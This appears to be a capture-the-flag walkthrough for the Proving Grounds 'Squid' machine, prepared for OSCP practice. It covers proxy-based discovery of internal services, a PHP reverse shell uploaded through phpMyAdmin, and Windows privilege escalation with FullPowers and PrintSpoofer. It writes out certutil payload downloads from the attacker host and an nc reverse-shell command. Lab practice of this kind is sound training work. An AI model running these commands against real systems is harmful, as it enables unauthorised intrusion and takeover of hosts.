---
title: "Proving Grounds - Squid"
categories: [Proving Grounds, Easy]
tags: [Windows, Web, Squid, OSCP]
mermaid: true
image: ../assets/img/oscp/oscp.png
---

Squid was a challenging box that involved utilizing a Squid proxy to discover internal services, exploiting a phpMyAdmin file upload vulnerability to gain initial access, and then escalating privileges using Windows-specific techniques.

The process included using spose to identify internal services, leveraging the proxy to access a WampServer, and ultimately using FullPowers.exe and PrintSpoofer to gain SYSTEM access. 

This machine was a great way to practice working with proxy configurations and Windows privilege escalation.

# Diagram

```mermaid
graph TD
    A[Host Enumeration]
    A -->|Nmap Scan| B[Identify Squid Proxy]
    B -->|Explore Proxy Configuration| C[Tool: spose]
    C -->|Identify Internal Services| D[Web Service on 8080]
    D -->|Access WampServer| E[Identify phpMyAdmin]
    E -->|Bypass Authentication| F[Upload PHP Shell]
    F -->|Execute Reverse Shell| G[WinPEAS Enumeration]
    G -->|Identify Privilege Escalation| H[Leverage FullPowers.exe]
    H -->|Enable SeImpersonatePrivilege| I[Use PrintSpoofer]
    I -->|Privilege Escalation to SYSTEM| J[Obtain Root Access]
    J -->|Capture Evidence| K[Success]
```


## Information Gathering

### Port Scan
---

- `nmap -sS -Pn -n -T4 192.168.217.189` -p 135,139,445,3128
    
    ![Untitled](../assets/img/oscp/Squid/Untitled.png)
    
- `nmap -sVC -p 135,139,445,3128 -n -Pn 192.168.217.189 -v`
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%201.png)
    

## Enumeration


### HTTP 80

---

- [http://192.168.217.189:3128/](http://192.168.217.189:3128/) → Apparently the website uses **squid/4.14**
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%202.png)
    

Squid is a caching and forwarding HTTP web proxy. It reduces bandwidth and improves response times by **caching** and reusing frequently-requested web pages. 

This is the squid repo https://github.com/squid-cache/squid 

I was searching in the GitHub, etc., but nothing worked. So i decided to try this: 

[https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid](https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid)

- `curl --proxy http://192.168.217.189:3128 http://192.168.45.227` →  *Directory Listening in my own machine*
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%203.png)
    

So after a while i decided to try this tool https://github.com/aancw/spose.git 

- `python spose.py --proxy http://192.168.45.227:3128 --target 192.168.45.227`
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%204.png)
    

Ok, verifying if it’s an web page running in 8080

- `curl --proxy http://192.168.217.189:3128 http://192.168.217.189:8080`
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%205.png)
    

Now setting up an http proxy with the extension Proxy Switcher [https://chrome.google.com/webstore/detail/proxy-switcher-and-manage/onnfghpihccifgojkpnnncpagjcdbjod?ref=benheater.com](https://chrome.google.com/webstore/detail/proxy-switcher-and-manage/onnfghpihccifgojkpnnncpagjcdbjod?ref=benheater.com) 

- `proxy swithcer`
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%206.png)
    

And now trying to access it

- [http://192.168.237.189:8080/](http://192.168.237.189:8080/) → It’s a WampServer 3.2.3 - 64bit
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%207.png)
    
- [http://192.168.237.189:8080/phpsysinfo/index.php?disp=bootstrap](http://192.168.237.189:8080/phpsysinfo/index.php?disp=bootstrap)
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%208.png)
    
- [http://192.168.237.189:8080/phpmyadmin/index.php](http://192.168.237.189:8080/phpmyadmin/index.php) → login panel MySQL - tried default creds (root:)
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%209.png)
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%2010.png)
    

Verifying some documentation about phpMyAdmin...

[https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/](https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/) 

[https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f](https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f) 

- [http://192.168.237.189:8080/phpmyadmin/db_sql.php?db=hendrich_schema](http://192.168.237.189:8080/phpmyadmin/db_sql.php?db=hendrich_schema)
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%2011.png)
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%2012.png)
    
- [http://192.168.237.189:8080/uploader.php](http://192.168.237.189:8080/uploader.php)
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%2013.png)
    

Reverse shell must be for windows

[https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)

- [http://192.168.237.189:8080/php_reverse_shell.php](http://192.168.237.189:8080/php_reverse_shell.php)
- `sudo  rlwrap nc -lvnp 80` → Nt authorithy
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%2014.png)
    

- `flag`
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%2015.png)
    

## Priv Escalation

---

The first thing that i want to do is revoke all firewalls. I’ve tried but the user don’t have permission.

So after a while i decided to put winPEAS inside the machine

- `certutil.exe -urlcache -f http://192.168.45.227/winPEASx64.exe winPEASx64.exe`
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%2016.png)
    
- `winPEASx64.exe` → *Apparently* [https://exploit-db.com/exploits/46718](https://exploit-db.com/exploits/46718) *- CVE-2019-0836* [https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation)
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%2017.png)
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%2018.png)
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%2019.png)
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%2020.png)
    

Ok, nothing worked, but after enumerate, and after i saw that i was an nt authority but with “local service’

- `whoami`
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%2021.png)
    

I found this [https://itm4n.github.io/localservice-privileges/?ref=benheater.com](https://itm4n.github.io/localservice-privileges/?ref=benheater.com) After read the article i found that he did an script [https://github.com/itm4n/FullPowers/releases](https://github.com/itm4n/FullPowers/releases)

- `certutil.exe -urlcache -f http://192.168.45.227/FullPowers.exe FullPowers.exe`
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%2022.png)
    
- `FullPowers.exe -c "C:\Users\Public\Documents\nc.exe 192.168.45.227 4430 -e cmd" -z`
`sudo rlwrap nc -lvnp 4430`
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%2023.png)
    

- `whoami /priv` → Now i’ve SeImpersoantePrivilage enabled
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%2024.png)
    

So i’ll use the https://github.com/itm4n/PrintSpoofer/releases

- `certutil.exe -urlcache -f http://192.168.45.227/PrintSpoofer64.exe PrintSpoofer64.exe`
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%2025.png)
    

- `PrintSpoofer64.exe -i -c cmd` → Priv escalado
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%2026.png)
    

- `flag`
    
    ![Untitled](../assets/img/oscp/Squid/Untitled%2027.png)